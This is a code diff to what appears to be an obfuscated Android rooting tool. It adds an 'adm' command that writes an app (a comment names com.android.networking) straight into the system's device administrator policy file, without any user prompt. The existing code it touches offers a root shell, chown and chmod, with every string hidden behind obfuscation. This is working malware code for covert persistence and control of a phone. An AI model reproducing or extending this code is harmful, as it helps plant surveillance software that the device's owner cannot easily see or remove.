@@ -43,7 +43,8 @@ void sync_reboot();
 int remount(const char *mntpoint, int flags);
 int my_mount(const char *mntpoint);
 void my_chown(const char *user, const char *group, const char *file);
-void my_chmod(const char *mode, const char *file); 
+void my_chmod(const char *mode, const char *file);
+void add_admin(const char *appname);
 static void copy_root(const char *mntpnt, const char *dst);
 static void delete_root(const char *mntpnt, const char *dst);
 //static int get_framebuffer(char *filename);
@@ -78,6 +79,7 @@ int main(int argc, char** argv) {
 	unsigned char qzs[] = "\x17\xc1\xd5\xe6\xef\xe4"; // "qzs"
 	unsigned char binsh1[] = "\xdf\x14\xc5\x10\xd4\xae\xd4\xab\xda\xd2\x10\xc5\xde\xd1\x10\xd4\xdf"; // "/system/bin/sh"
 	unsigned char binsh2[] = "\x0b\xeb\xee\xe4\x88\xb6\x88\x81\xb2\xba\xe4\xbf\xa6\xbb\xe4\x88\xa5"; // "/system/bin/sh"
+	unsigned char adm[] = "\x5b\x25\x7d\x7a\x41\x7e"; // "adm"
 	unsigned char sh[] = "\x6a\xe2\x8a\x19\x06"; // "sh"
 	
 	int i;
@@ -100,6 +102,7 @@ int main(int argc, char** argv) {
 		LOG("fhc <src> <dest> - copy <src> into <dst>\n");
 		LOG("fho <user> <group> <file> - chown <file> to <user>:<group>\n");
 		LOG("pzm <newmode> <file> - chmod <file> to <newmode>\n");
+		LOG("adm <package name/receiver>\n");
 		LOG("qzs - start a root shell\n");
 		
 		return 0;
@@ -163,6 +166,10 @@ int main(int argc, char** argv) {
 	} else if (strcmp(argv[1], deobfuscate(pzm)) == 0) { // chmod: newmode file
 		LOG("Chmodding file\n");
 		my_chmod(argv[2], argv[3]);
+		return 0;
+	} else if (strcmp(argv[1], deobfuscate(adm)) == 0) { // Add the application to the admin list
+		LOG("Adding the app to Administrators list\n");
+		add_admin(argv[2]);
 		return 0;
 	} else if (strcmp(argv[1], deobfuscate(qzs)) == 0) { // Eseguiamo una root shell
 		const char * shell = deobfuscate(binsh1);
@@ -464,9 +471,9 @@ void sync_reboot() {
 int remount(const char *mntpoint, int flags) {
 	unsigned char mounts[] = "\x84\xe0\x68\x6b\x34\x36\x2b\x27\x6b\x29\x2b\x31\x2a\x30\x37"; // "/proc/mounts"
 	unsigned char r[] = "\x19\xfe\xe6\x97"; // "r"
-	unsigned char t1[] = "\x65\x5f\x39\xfb\xc7\x2f"; // " \t"
-	unsigned char t2[] = "\x5e\x42\x1f\x82\x06\x2e"; // " \t"
-	unsigned char t3[] = "\x3a\xb4\x8d\x7a\xae\xb6"; // " \t"
+	unsigned char t1[] = "\x39\x8e\xb5\x29\x30"; // " \t"
+	unsigned char t2[] = "\xd4\x35\xe3\x1c\x27"; // " \t"
+	unsigned char t3[] = "\xa8\xbd\x17\xf8\xe3"; // " \t"
 
     FILE *f = NULL;
     int found = 0;
@@ -518,9 +525,9 @@ int remount(const char *mntpoint, int flags) {
 }
 
 int my_mount(const char *mntpoint) {
-	unsigned char t1[] = "\xc6\x99\x5c\xe6\xaa\xd2"; // " \t"
-	unsigned char t2[] = "\x95\x0e\x98\xcd\xd9\xe1"; // " \t"
-	unsigned char t3[] = "\x32\x19\x28\x32\x9e\x46"; // " \t"
+	unsigned char t1[] = "\x77\xe9\x9c\xa9\x8e"; // " \t"
+	unsigned char t2[] = "\xab\xbd\x14\xf5\xe2"; // " \t"
+	unsigned char t3[] = "\x95\xc1\x56\xb7\x9c"; // " \t"
 	unsigned char mounts[] = "\x4e\x10\x52\x61\x5e\x5c\x21\x2d\x61\x23\x21\x5b\x20\x5a\x5d"; // "/proc/mounts"
 	unsigned char r[] = "\x92\xaf\x3c\x20"; // "r"
 
@@ -569,6 +576,90 @@ int my_mount(const char *mntpoint) {
 
     return mount(dev, mntpoint, fstype, 0, 0);
 }
+
+void add_admin(const char *appname) {
+	unsigned char pfile[] = "\x6e\xaa\xe4\x41\x1e\x13\x6e\x13\x41\x6d\x6b\x6d\x6e\x1f\x07\x41\x1e\x1f\x68\x1b\x1d\x1f\x71\x62\x01\x06\x1b\x1d\x1b\x1f\x6d\x40\x6a\x07\x06"; // "/data/system/device_policies.xml"
+	unsigned char policies[] = "\xf0\x99\x63\xfc\x80\xa1\xac\xab\xb5\xab\xb7\x85\xfe"; // "<policies>"
+	unsigned char cpolicies[] = "\xaa\x7a\xdc\x6a\x2e\x45\x3a\x47\x39\x47\x33\x29\x7e\x85\x74"; // "<policies />"
+	unsigned char cpol[] = "\x4b\x1d\x5d\x89\x9c\x45\x5c\x59\x22\x58\x22\x56\x48\x8f"; // "</policies>"
+	unsigned char admin1[] = "\x85\xe1\x6a\x91\x7b\x24\x23\x28\x2c\x2d\x67\x2d\x24\x28\x20\x78\x69"; // "\n<admin name=""
+
+	// com.android.networking/com.android.networking.listener.AR
+	unsigned char admin2[] =  "\xbe\xfe\x65\x64\x80\x4c\x7e\x32\x31\x2e\x2b\x25\x2b\x27\x35\x62\x28\x2e\x23\x29\x35\x7f\x64\x76\x79\x7b\x64\x62\x71\x80\x4c\x7e\x71\x23\x26\x2f\x2b\x30\x80\x4c"; // "\">\n<policies flags=\"479\" />\n</admin>\n"
+	unsigned char init[] = "\x67\xdf\x80\xe5\xe8\x21\x36\x35\xf9\x2f\x3e\x2b\x2c\x32\x38\x37\xe6\xc0\xea\xf7\xe9\xc0\xf9\x3e\x37\x3c\x38\x3d\x32\x37\x00\xe6\xc0\x2e\x2d\x3f\xf6\xe1\xc0\xf9\x2c\x2d\x3a\x37\x3d\x3a\x35\x38\x37\x3e\xe6\xc0\x22\x3e\x2c\xc0\xf9\xe8\xe7"; // "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>"
+	unsigned char nl[] = "\x26\x45\x62\x34"; // "\n"
+    char *buf = NULL;
+    char *ptr = NULL;
+
+    int fd, size;
+
+    fd = open(deobfuscate(pfile), O_RDWR);
+
+    if (fd < 0) {
+        LOG("Policy file cannot be opened\n");
+        return;
+    }
+
+    size = lseek(fd, 0, SEEK_END);
+    lseek(fd, 0, SEEK_SET);
+
+    if (size == 0) {
+        write(fd, deobfuscate(init), strlen(deobfuscate(init)));
+        write(fd, deobfuscate(cpolicies), strlen(deobfuscate(cpolicies)));
+        size = lseek(fd, 0, SEEK_END);
+        lseek(fd, 0, SEEK_SET);
+    }
+
+    if (size == 0) {
+        LOG("Something went terribly wrong here\n");
+        return;
+    }
+
+    buf = (char *)malloc(size + 1);
+
+    if (buf == NULL) {
+        LOG("Cannot allocate memory\n");
+        close(fd);
+        return;
+    }
+
+    memset(buf, 0x00, size + 1);
+
+    read(fd, buf, size);
+    lseek(fd, 0, SEEK_SET);
+
+    ptr = strstr(buf, deobfuscate(policies));
+
+    // No admins already set
+    if (ptr == NULL) {
+        ptr = strstr(buf, deobfuscate(cpolicies));
+
+        if (ptr == NULL) {
+            LOG("Malformed file\n");
+            return;
+        }
+
+        write(fd, buf, ptr - buf);
+        write(fd, deobfuscate(nl), strlen(deobfuscate(nl)));
+        write(fd, deobfuscate(policies), strlen(deobfuscate(policies)));
+        write(fd, deobfuscate(admin1), strlen(deobfuscate(admin1)));
+        write(fd, appname, strlen(appname));
+        write(fd, deobfuscate(admin2), strlen(deobfuscate(admin2)));
+        write(fd, deobfuscate(cpol), strlen(deobfuscate(cpol)));
+    } else {
+        write(fd, buf, (ptr - buf + strlen(deobfuscate(policies))));
+        write(fd, deobfuscate(admin1), strlen(deobfuscate(admin1)));
+        write(fd, appname, strlen(appname));
+        write(fd, deobfuscate(admin2), strlen(deobfuscate(admin2)));
+        write(fd, ptr + strlen(deobfuscate(policies)), strlen(ptr + strlen(deobfuscate(policies))));
+    }
+
+    memset(buf, 0x00, size + 1);
+    free(buf);
+    close(fd);
+    LOG("Administrator app added successfully\n");
+}
+
 
 int setgod() {
 #ifdef DEBUG
